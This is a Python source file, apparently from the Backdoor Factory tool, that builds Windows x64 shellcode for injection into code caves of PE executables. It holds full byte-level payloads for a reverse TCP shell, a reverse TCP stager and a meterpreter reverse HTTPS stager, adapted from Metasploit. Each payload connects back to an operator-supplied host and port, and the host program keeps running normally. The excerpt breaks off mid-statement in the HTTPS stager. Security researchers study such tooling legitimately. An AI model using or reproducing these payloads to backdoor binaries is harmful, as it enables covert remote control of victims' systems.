'''
    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
    
    Copyright (C) 2013,2014, Joshua Pitts

    License:   GPLv3

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    See <http://www.gnu.org/licenses/> for a copy of the GNU General
    Public License

    Currently supports win32/64 PE and linux32/64 ELF only(intel architecture).
    This program is to be used for only legal activities by IT security
    professionals and researchers. Author not responsible for malicious
    uses.
'''


##########################################################
#               BEGIN win64 shellcodes                   #
##########################################################
import struct
import sys
from intelmodules import eat_code_caves

class winI64_shellcode():
    """
    Windows Intel x64 shellcode class
    """
    
    def __init__(self, HOST, PORT, SUPPLIED_SHELLCODE):
        self.HOST = HOST
        self.PORT = PORT
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.shellcode = ""
        self.stackpreserve = ("\x90\x90\x50\x53\x51\x52\x56\x57\x54\x55\x41\x50"
                              "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              )

        self.stackrestore = ("\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                             "\x41\x58\x5d\x5c\x5f\x5e\x5a\x59\x5b\x58"
                             )

    def pack_ip_addresses(self):
        hostocts = []
        if self.HOST is None:
            print "This shellcode requires a HOST parameter -H"
            sys.exit(1)
        for i, octet in enumerate(self.HOST.split('.')):
                hostocts.append(int(octet))
        self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
                                  hostocts[2], hostocts[3])
        return self.hostip

    def returnshellcode(self):
        return self.shellcode

    def reverse_shell_tcp(self, flItms, CavesPicked={}):
        """
        Modified metasploit windows/x64/shell_reverse_tcp
        """
        if self.PORT is None:
            print ("Must provide port")
            sys.exit(1)

        breakupvar = eat_code_caves(flItms, 0, 1)

        self.shellcode1 = ("\xfc"
                           "\x48\x83\xe4\xf0"
                           "\xe8")

        if flItms['cave_jumping'] is True:
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar -
                                                   len(self.stackpreserve) - len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xc0\x00\x00\x00"

        self.shellcode1 += ("\x41\x51\x41\x50\x52"
                            "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
                            "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
                            "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
                            "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
                            "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
                            "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
                            "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
                            "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
                            "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
                            "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
                            "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
                            "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
                            "\x8b\x12\xe9\x57\xff\xff\xff")

        self.shellcode2 = ("\x5d\x49\xbe\x77\x73\x32\x5f\x33"
                           "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
                           "\x49\x89\xe5\x49\xbc\x02\x00")
        self.shellcode2 += struct.pack('!h', self.PORT)
        self.shellcode2 += self.pack_ip_addresses()
        self.shellcode2 += ("\x41\x54"
                            "\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
                            "\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"
                            "\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"
                            "\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
                            "\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99"
                            "\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63"
                            "\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57"
                            "\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"
                            "\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6"
                            "\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff"
                            "\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5"
                            "\x48\x31\xd2\x90\x90\x90\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
                            "\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
                            "\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
                            "\x72\x6f\x6a\x00\x59\x41\x89\xda"
                            "\x48\x81\xc4\xf8\x00\x00\x00"  # Add RSP X ; align stack
                            )

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2 + self.stackrestore
        return (self.stackpreserve + self.shellcode1, self.shellcode2 + self.stackrestore)

    def reverse_tcp_stager(self, flItms, CavesPicked={}):
        """
        Ported the x32 payload from msfvenom for patching win32 binaries (shellcode1) 
        with the help of Steven Fewer's work on msf win64 payloads. 
        """
        if self.PORT is None:
            print ("Must provide port")
            sys.exit(1)

        flItms['stager'] = True

        #overloading the class stackpreserve
        self.stackpreserve = ("\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50"
                              "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              )

        breakupvar = eat_code_caves(flItms, 0, 1)
       
        self.shellcode1 = ( "\x90"                              #<--THAT'S A NOP. \o/
                            "\xe8\xc0\x00\x00\x00"              #jmp to allocate
                            #api_call
                            "\x41\x51"                          #push r9
                            "\x41\x50"                          #push r8
                            "\x52"                              #push rdx
                            "\x51"                              #push rcx
                            "\x56"                              #push rsi
                            "\x48\x31\xD2"                      #xor rdx,rdx
                            "\x65\x48\x8B\x52\x60"              #mov rdx,qword ptr gs:[rdx+96]
                            "\x48\x8B\x52\x18"                  #mov rdx,qword ptr [rdx+24]
                            "\x48\x8B\x52\x20"                  #mov rdx,qword ptr[rdx+32]
                            #next_mod
                            "\x48\x8b\x72\x50"                  #mov rsi,[rdx+80]
                            "\x48\x0f\xb7\x4a\x4a"              #movzx rcx,word [rdx+74]      
                            "\x4d\x31\xc9"                      #xor r9,r9
                            #loop_modname
                            "\x48\x31\xc0"                      #xor rax,rax          
                            "\xac"                              #lods
                            "\x3c\x61"                          #cmp al, 61h (a)
                            "\x7c\x02"                          #jl 02
                            "\x2c\x20"                          #sub al, 0x20 
                            #not_lowercase
                            "\x41\xc1\xc9\x0d"                  #ror r9d, 13
                            "\x41\x01\xc1"                      #add r9d, eax
                            "\xe2\xed"                          #loop until read, back to xor rax, rax
                            "\x52"                              #push rdx ; Save the current position in the module list for later
                            "\x41\x51"                          #push r9 ; Save the current module hash for later
                                                                #; Proceed to itterate the export address table,
                            "\x48\x8b\x52\x20"                  #mov rdx, [rdx+32] ; Get this modules base address
                            "\x8b\x42\x3c"                      #mov eax, dword [rdx+60] ; Get PE header
                            "\x48\x01\xd0"                      #add rax, rdx ; Add the modules base address
                            "\x8b\x80\x88\x00\x00\x00"          #mov eax, dword [rax+136] ; Get export tables RVA
                            "\x48\x85\xc0"                      #test rax, rax ; Test if no export address table is present
                            
                            "\x74\x67"                          #je get_next_mod1 ; If no EAT present, process the next module
                            "\x48\x01\xd0"                      #add rax, rdx ; Add the modules base address
                            "\x50"                              #push rax ; Save the current modules EAT
                            "\x8b\x48\x18"                      #mov ecx, dword [rax+24] ; Get the number of function names
                            "\x44\x8b\x40\x20"                  #mov r8d, dword [rax+32] ; Get the rva of the function names
                            "\x49\x01\xd0"                      #add r8, rdx ; Add the modules base address
                                                                #; Computing the module hash + function hash
                            #get_next_func: ;
                            "\xe3\x56"                          #jrcxz get_next_mod ; When we reach the start of the EAT (we search backwards), process the next module
                            "\x48\xff\xc9"                      #  dec rcx ; Decrement the function name counter
                            "\x41\x8b\x34\x88"                  #  mov esi, dword [r8+rcx*4]; Get rva of next module name
                            "\x48\x01\xd6"                      #  add rsi, rdx ; Add the modules base address
                            "\x4d\x31\xc9"                      # xor r9, r9 ; Clear r9 which will store the hash of the function name
                                                                #  ; And compare it to the one we wan                        
                            #loop_funcname: ;
                            "\x48\x31\xc0"                      #xor rax, rax ; Clear rax
                            "\xac"                              #lodsb ; Read in the next byte of the ASCII function name
                            "\x41\xc1\xc9\x0d"                  #ror r9d, 13 ; Rotate right our hash value
                            "\x41\x01\xc1"                      #add r9d, eax ; Add the next byte of the name
                            "\x38\xe0"                          #cmp al, ah ; Compare AL (the next byte from the name) to AH (null)
                            "\x75\xf1"                          #jne loop_funcname ; If we have not reached the null terminator, continue
                            "\x4c\x03\x4c\x24\x08"              #add r9, [rsp+8] ; Add the current module hash to the function hash
                            "\x45\x39\xd1"                      #cmp r9d, r10d ; Compare the hash to the one we are searchnig for
                            "\x75\xd8"                          #jnz get_next_func ; Go compute the next function hash if we have not found it
                                                                #; If found, fix up stack, call the function and then value else compute the next one...
                            "\x58"                              #pop rax ; Restore the current modules EAT
                            "\x44\x8b\x40\x24"                  #mov r8d, dword [rax+36] ; Get the ordinal table rva
                            "\x49\x01\xd0"                      #add r8, rdx ; Add the modules base address
                            "\x66\x41\x8b\x0c\x48"              #mov cx, [r8+2*rcx] ; Get the desired functions ordinal
                            "\x44\x8b\x40\x1c"                  #mov r8d, dword [rax+28] ; Get the function addresses table rva
                            "\x49\x01\xd0"                      #add r8, rdx ; Add the modules base address
                            "\x41\x8b\x04\x88"                  #mov eax, dword [r8+4*rcx]; Get the desired functions RVA
                            "\x48\x01\xd0"                      #add rax, rdx ; Add the modules base address to get the functions actual VA
                                                                #; We now fix up the stack and perform the call to the drsired function...
                            #finish:
                            "\x41\x58"                          #pop r8 ; Clear off the current modules hash
                            "\x41\x58"                          #pop r8 ; Clear off the current position in the module list
                            "\x5E"                              #pop rsi ; Restore RSI
                            "\x59"                              #pop rcx ; Restore the 1st parameter
                            "\x5A"                              #pop rdx ; Restore the 2nd parameter
                            "\x41\x58"                          #pop r8 ; Restore the 3rd parameter
                            "\x41\x59"                          #pop r9 ; Restore the 4th parameter
                            "\x41\x5A"                          #pop r10 ; pop off the return address
                            "\x48\x83\xEC\x20"                  #sub rsp, 32 ; reserve space for the four register params (4 * sizeof(QWORD) = 32)
                                                                # ; It is the callers responsibility to restore RSP if need be (or alloc more space or align RSP).
                            "\x41\x52"                          #push r10 ; push back the return address
                            "\xFF\xE0"                          #jmp rax ; Jump into the required function
                                                                #; We now automagically return to the correct caller...
                            #get_next_mod: ;
                            "\x58"                              #pop rax ; Pop off the current (now the previous) modules EAT
                            #get_next_mod1: ;
                            "\x41\x59"                          #pop r9 ; Pop off the current (now the previous) modules hash
                            "\x5A"                              #pop rdx ; Restore our position in the module list
                            "\x48\x8B\x12"                      #mov rdx, [rdx] ; Get the next module
                            "\xe9\x57\xff\xff\xff"              #jmp next_mod ; Process this module
                            )

        self.shellcode1 += (#allocate
                            "\x5d"                              #pop rbp
                            "\x49\xc7\xc6\xab\x01\x00\x00"      #mov r14, 1abh size of payload
                            "\x6a\x40"                          #push 40h
                            "\x41\x59"                          #pop r9 now 40h
                            "\x68\x00\x10\x00\x00"              #push 1000h
                            "\x41\x58"                          #pop r8.. now 1000h
                            "\x4C\x89\xF2"                      #mov rdx, r14
                            "\x6A\x00"                          # push 0
                            "\x59"                              # pop rcx
                            "\x68\x58\xa4\x53\xe5"              #push E553a458
                            "\x41\x5A"                          #pop r10
                            "\xff\xd5"                          #call rbp
                            "\x48\x89\xc3"                      #mov rbx, rax      ; Store allocated address in ebx
                            "\x48\x89\xc7"                      #mov rdi, rax      ; Prepare EDI with the new address
                            "\x48\xC7\xC1\xAB\x01\x00\x00"      #mov rcx, 0x1ab
                            )
        
        #call the get_payload right before the payload
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xeb\x43" 

                            # got_payload:
        self.shellcode1 += ( "\x5e"                                 #pop rsi            ; Prepare ESI with the source to copy               
                            "\xf2\xa4"                              #rep movsb          ; Copy the payload to RWX memory
                            "\xe8\x00\x00\x00\x00"                  #call set_handler   ; Configure error handling

                            #Not Used... :/  Can probably live without.. 
                            #exitfunk:
                            #"\x48\xC7\xC3\xE0\x1D\x2A\x0A"          #   mov rbx, 0x0A2A1DE0    ; The EXITFUNK as specified by user...
                            #"\x68\xa6\x95\xbd\x9d"                  #   push 0x9DBD95A6        ; hash( "kernel32.dll", "GetVersion" )
                            #"\xFF\xD5"                              #   call rbp               ; GetVersion(); (AL will = major version and AH will = minor version)
                            #"\x3C\x06"                              #   cmp al, byte 6         ; If we are not running on Windows Vista, 2008 or 7
                            #"\x7c\x0a"                              #   jl goodbye       ; Then just call the exit function...
                            #"\x80\xFB\xE0"                          #  cmp bl, 0xE0           ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, 2008 or 7...
                            #"\x75\x05"                              #   jne goodbye      ;
                            #"\x48\xC7\xC3\x47\x13\x72\x6F"          #   mov rbx, 0x6F721347    ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThread
                            # goodbye:                 ; We now perform the actual call to the exit function
                            #"\x6A\x00"                              #   push byte 0            ; push the exit function parameter
                            #"\x53"                                  #   push rbx               ; push the hash of the exit function
                            #"\xFF\xD5"                              #   call rbp               ; call EXITFUNK( 0 );

                            #set_handler:
                            "\x48\x31\xC0" #  xor rax,rax
                            
                            "\x50"                                  #  push rax          ; LPDWORD lpThreadId (NULL)
                            "\x50"                                  #  push rax          ; DWORD dwCreationFlags (0)
                            "\x49\x89\xC1"                          # mov r9, rax        ; LPVOID lpParameter (NULL)
                            "\x48\x89\xC2"                          #mov rdx, rax        ; LPTHREAD_START_ROUTINE lpStartAddress (payload)
                            "\x49\x89\xD8"                          #mov r8, rbx         ; SIZE_T dwStackSize (0 for default)
                            "\x48\x89\xC1"                          #mov rcx, rax        ; LPSECURITY_ATTRIBUTES lpThreadAttributes (NULL)
                            "\x49\xC7\xC2\x38\x68\x0D\x16"          #mov r10, 0x160D6838  ; hash( "kernel32.dll", "CreateThread" )
                            "\xFF\xD5"                              #  call rbp               ; Spawn payload thread
                            "\x48\x83\xC4\x58"                      #add rsp, 50
                            
                            #stackrestore
                            "\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                            "\x41\x58\x5d\x5f\x5e\x5a\x59\x5b\x58"
                            )
        
        
        breakupvar = eat_code_caves(flItms, 0, 2)
        
        #Jump to the win64 return to normal execution code segment.
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3).rstrip('L')), 16))
        else:
            self.shellcode1 += "\xE9\xab\x01\x00\x00"

        
        breakupvar = eat_code_caves(flItms, 0, 1)
        
        #get_payload:  #Jump back with the address for the payload on the stack.
        if flItms['cave_jumping'] is True:
            self.shellcode2 = "\xe8"
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                   len(self.shellcode2) + 272).rstrip('L')), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                   breakupvar + 272).rstrip('L')), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                             len(self.shellcode2) + 244).rstrip('L')), 16))
        else:
            self.shellcode2 = "\xE8\xB8\xFF\xFF\xFF"
        
        """
        shellcode2
        /*
         * windows/x64/shell/reverse_tcp - 422 bytes (stage 1)
           ^^windows/x64/meterpreter/reverse_tcp will work with this
         * http://www.metasploit.com
         * VERBOSE=false, LHOST=127.0.0.1, LPORT=8080, 
         * ReverseConnectRetries=5, ReverseListenerBindPort=0, 
         * ReverseAllowProxy=false, EnableStageEncoding=false, 
         * PrependMigrate=false, EXITFUNC=thread, 
         * InitialAutoRunScript=, AutoRunScript=
         */
         """
                       
        #payload  
        self.shellcode2 += ( "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
                            "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
                            "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
                            "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
                            "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
                            "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
                            "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
                            "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
                            "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
                            "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
                            "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
                            "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
                            "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
                            "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
                            "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
                            "\x49\x89\xe5\x49\xbc\x02\x00"
                            #"\x1f\x90"
                            #"\x7f\x00\x00\x01"
                            )
        self.shellcode2 += struct.pack('!h', self.PORT)
        self.shellcode2 += self.pack_ip_addresses()
        self.shellcode2 += ( "\x41\x54"
                            "\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
                            "\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"
                            "\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"
                            "\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
                            "\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99"
                            "\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x48\x83\xec"
                            "\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41"
                            "\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x83\xc4\x20\x5e\x6a\x40\x41"
                            "\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41"
                            "\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
                            "\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8"
                            "\x5f\xff\xd5\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xe1\x41"
                            "\xff\xe7"
                            )

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return (self.stackpreserve + self.shellcode1, self.shellcode2)

    def meterpreter_reverse_https(self, flItms, CavesPicked={}):
        """
        Win64 version
        """
        if self.PORT is None:
            print ("Must provide port")
            sys.exit(1)
        
        flItms['stager'] = True

        #overloading the class stackpreserve
        self.stackpreserve = ("\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50"
                              "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              )

        breakupvar = eat_code_caves(flItms, 0, 1)
       
        self.shellcode1 = ( "\x90"                              #<--THAT'S A NOP. \o/
                            "\xe8\xc0\x00\x00\x00"              #jmp to allocate
                            #api_call
                            "\x41\x51"                          #push r9
                            "\x41\x50"                          #push r8
                            "\x52"                              #push rdx
                            "\x51"                              #push rcx
                            "\x56"                              #push rsi
                            "\x48\x31\xD2"                      #xor rdx,rdx
                            "\x65\x48\x8B\x52\x60"              #mov rdx,qword ptr gs:[rdx+96]
                            "\x48\x8B\x52\x18"                  #mov rdx,qword ptr [rdx+24]
                            "\x48\x8B\x52\x20"                  #mov rdx,qword ptr[rdx+32]
                            #next_mod
                            "\x48\x8b\x72\x50"                  #mov rsi,[rdx+80]
                            "\x48\x0f\xb7\x4a\x4a"              #movzx rcx,word [rdx+74]      
                            "\x4d\x31\xc9"                      #xor r9,r9
                            #loop_modname
                            "\x48\x31\xc0"                      #xor rax,rax          
                            "\xac"                              #lods
                            "\x3c\x61"                          #cmp al, 61h (a)
                            "\x7c\x02"                          #jl 02
                            "\x2c\x20"                          #sub al, 0x20 
                            #not_lowercase
                            "\x41\xc1\xc9\x0d"                  #ror r9d, 13
                            "\x41\x01\xc1"                      #add r9d, eax
                            "\xe2\xed"                          #loop until read, back to xor rax, rax
                            "\x52"                              #push rdx ; Save the current position in the module list for later
                            "\x41\x51"                          #push r9 ; Save the current module hash for later
                                                                #; Proceed to itterate the export address table,
                            "\x48\x8b\x52\x20"                  #mov rdx, [rdx+32] ; Get this modules base address
                            "\x8b\x42\x3c"                      #mov eax, dword [rdx+60] ; Get PE header
                            "\x48\x01\xd0"                      #add rax, rdx ; Add the modules base address
                            "\x8b\x80\x88\x00\x00\x00"          #mov eax, dword [rax+136] ; Get export tables RVA
                            "\x48\x85\xc0"                      #test rax, rax ; Test if no export address table is present
                            
                            "\x74\x67"                          #je get_next_mod1 ; If no EAT present, process the next module
                            "\x48\x01\xd0"                      #add rax, rdx ; Add the modules base address
                            "\x50"                              #push rax ; Save the current modules EAT
                            "\x8b\x48\x18"                      #mov ecx, dword [rax+24] ; Get the number of function names
                            "\x44\x8b\x40\x20"                  #mov r8d, dword [rax+32] ; Get the rva of the function names
                            "\x49\x01\xd0"                      #add r8, rdx ; Add the modules base address
                                                                #; Computing the module hash + function hash
                            #get_next_func: ;
                            "\xe3\x56"                          #jrcxz get_next_mod ; When we reach the start of the EAT (we search backwards), process the next module
                            "\x48\xff\xc9"                      #  dec rcx ; Decrement the function name counter
                            "\x41\x8b\x34\x88"                  #  mov esi, dword [r8+rcx*4]; Get rva of next module name
                            "\x48\x01\xd6"                      #  add rsi, rdx ; Add the modules base address
                            "\x4d\x31\xc9"                      # xor r9, r9 ; Clear r9 which will store the hash of the function name
                                                                #  ; And compare it to the one we wan                        
                            #loop_funcname: ;
                            "\x48\x31\xc0"                      #xor rax, rax ; Clear rax
                            "\xac"                              #lodsb ; Read in the next byte of the ASCII function name
                            "\x41\xc1\xc9\x0d"                  #ror r9d, 13 ; Rotate right our hash value
                            "\x41\x01\xc1"                      #add r9d, eax ; Add the next byte of the name
                            "\x38\xe0"                          #cmp al, ah ; Compare AL (the next byte from the name) to AH (null)
                            "\x75\xf1"                          #jne loop_funcname ; If we have not reached the null terminator, continue
                            "\x4c\x03\x4c\x24\x08"              #add r9, [rsp+8] ; Add the current module hash to the function hash
                            "\x45\x39\xd1"                      #cmp r9d, r10d ; Compare the hash to the one we are searchnig for
                            "\x75\xd8"                          #jnz get_next_func ; Go compute the next function hash if we have not found it
                                                                #; If found, fix up stack, call the function and then value else compute the next one...
                            "\x58"                              #pop rax ; Restore the current modules EAT
                            "\x44\x8b\x40\x24"                  #mov r8d, dword [rax+36] ; Get the ordinal table rva
                            "\x49\x01\xd0"                      #add r8, rdx ; Add the modules base address
                            "\x66\x41\x8b\x0c\x48"              #mov cx, [r8+2*rcx] ; Get the desired functions ordinal
                            "\x44\x8b\x40\x1c"                  #mov r8d, dword [rax+28] ; Get the function addresses table rva
                            "\x49\x01\xd0"                      #add r8, rdx ; Add the modules base address
                            "\x41\x8b\x04\x88"                  #mov eax, dword [r8+4*rcx]; Get the desired functions RVA
                            "\x48\x01\xd0"                      #add rax, rdx ; Add the modules base address to get the functions actual VA
                                                                #; We now fix up the stack and perform the call to the drsired function...
                            #finish:
                            "\x41\x58"                          #pop r8 ; Clear off the current modules hash
                            "\x41\x58"                          #pop r8 ; Clear off the current position in the module list
                            "\x5E"                              #pop rsi ; Restore RSI
                            "\x59"                              #pop rcx ; Restore the 1st parameter
                            "\x5A"                              #pop rdx ; Restore the 2nd parameter
                            "\x41\x58"                          #pop r8 ; Restore the 3rd parameter
                            "\x41\x59"                          #pop r9 ; Restore the 4th parameter
                            "\x41\x5A"                          #pop r10 ; pop off the return address
                            "\x48\x83\xEC\x20"                  #sub rsp, 32 ; reserve space for the four register params (4 * sizeof(QWORD) = 32)
                                                                # ; It is the callers responsibility to restore RSP if need be (or alloc more space or align RSP).
                            "\x41\x52"                          #push r10 ; push back the return address
                            "\xFF\xE0"                          #jmp rax ; Jump into the required function
                                                                #; We now automagically return to the correct caller...
                            #get_next_mod: ;
                            "\x58"                              #pop rax ; Pop off the current (now the previous) modules EAT
                            #get_next_mod1: ;
                            "\x41\x59"                          #pop r9 ; Pop off the current (now the previous) modules hash
                            "\x5A"                              #pop rdx ; Restore our position in the module list
                            "\x48\x8B\x12"                      #mov rdx, [rdx] ; Get the next module
                            "\xe9\x57\xff\xff\xff"              #jmp next_mod ; Process this module
                            )

        self.shellcode1 += (#allocate
                            "\x5d"                              #pop rbp
                            "\x49\xc7\xc6"                      #mov r14, 1abh size of payload...   
                            )
        self.shellcode1 += struct.pack("<H", 583 + len(self.HOST))
        self.shellcode1 += ("\x00\x00"
                            "\x6a\x40"                          #push 40h
                            "\x41\x59"                          #pop r9 now 40h
                            "\x68\x00\x10\x00\x00"              #push 1000h
                            "\x41\x58"                          #pop r8.. now 1000h
                            "\x4C\x89\xF2"                      #mov rdx, r14
                            "\x6A\x00"                          # push 0
                            "\x59"                              # pop rcx
                            "\x68\x58\xa4\x53\xe5"              #push E553a458
                            "\x41\x5A"                          #pop r10
                            "\xff\xd5"                          #call rbp
                            "\x48\x89\xc3"                      #mov rbx, rax      ; Store allocated address in ebx
                            "\x48\x89\xc7"                      #mov rdi, rax      ; Prepare EDI with the new address
                            )
                                                                #mov rcx, 0x1abE
        self.shellcode1 += "\x48\xc7\xc1"
        self.shellcode1 += struct.pack("<H", 583 + len(self.HOST))
        self.shellcode1 += "\x00\x00"
                            
        #call the get_payload right before the payload
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xeb\x43" 

                            # got_payload:
        self.shellcode1 += ( "\x5e"                                 #pop rsi            ; Prepare ESI with the source to copy               
